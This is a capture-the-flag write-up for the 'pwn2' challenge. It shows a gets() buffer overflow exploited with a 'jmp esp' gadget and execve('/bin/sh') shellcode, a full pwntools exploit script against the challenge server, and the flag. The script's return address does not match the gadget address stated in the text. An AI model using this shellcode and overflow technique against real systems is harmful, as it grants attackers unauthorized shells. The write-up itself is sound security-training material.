# pwn2

```pwn2``` was a binary that just let us run the command ```ls``` on a server.

Output:
```
$ ls
flag.txt
pwn2
Bye!
```

The binary itself was vulnerable due to classic a ```gets``` overflow. 

There was not a ```win``` function that we could jump to like the previous challenge.

When checking ```checksec``` we can see the binary doe not have NX enabled. This means we can run some shellcode.

```
[*] '/home/main_user/GitHub/CTF_Writeups/2019/ENCRYPT/pwn/pwn_2/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

The hardest thing about shellcode exploits is actually reaching and executing shellcode consistently on different machine configurations.

With further investigation into the binary I was able to find the perfect ROP gadget for executing the shellcode

```
0x08048544 : jmp esp
```

This will take us to the top of the stack. This is a perfect command to execute our shellcode.

This being put together will result in a payload that is:

```
BUFFER JUNK      RETURN ADDR           SHELLCODE
 [ A x 44]    +   [jmp esp]    +   [\x31\xc0\x50\....]
```

The exploit for the challenge is below:


```python
from pwn import *
import struct

r = remote("104.154.106.182", 3456)

# Length of the vuln buffer
BUFFER_LEN = 44

# sh shellcode 
SHELLCODE = b""
SHELLCODE += b"\x31\xc0\x50\x68\x2f\x2f\x73"
SHELLCODE += b"\x68\x68\x2f\x62\x69\x6e\x89"
SHELLCODE += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
SHELLCODE += b"\xcd\x80\x31\xc0\x40\xcd\x80"

# Will take us to just after the ret pointer
# 0x08048544 : jmp esp
ret_add = p32(0x8048541)

payload = b""
payload += b"A" * BUFFER_LEN
payload += ret_add
payload += SHELLCODE

r.recv()
r.sendline(payload)
r.interactive()
```

```FLAG: encryptCTF{N!c3_j0b_jump3R}```